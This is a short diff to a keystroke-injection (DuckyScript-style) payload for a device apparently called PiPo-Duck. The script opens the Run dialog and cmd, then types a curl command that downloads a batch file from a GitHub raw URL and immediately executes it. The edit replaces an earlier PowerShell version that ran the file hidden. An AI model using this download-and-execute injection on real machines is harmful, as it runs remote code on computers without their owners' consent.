@@ -4,8 +4,8 @@
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell
+STRING cmd
 ENTER
-DELAY 700
-STRING curl -o pipo-alert.bat https://raw.githubusercontent.com/StuffzEZ/PiPo-Duck/refs/heads/scripts/batch/picods-alert.bat; Start-Process alert.bat -WindowStyle Hidden
+DELAY 500
+STRING curl -o alert.bat https://raw.githubusercontent.com/StuffzEZ/PiPo-Duck/refs/heads/scripts/batch/picods-alert.bat && alert.bat
 ENTER
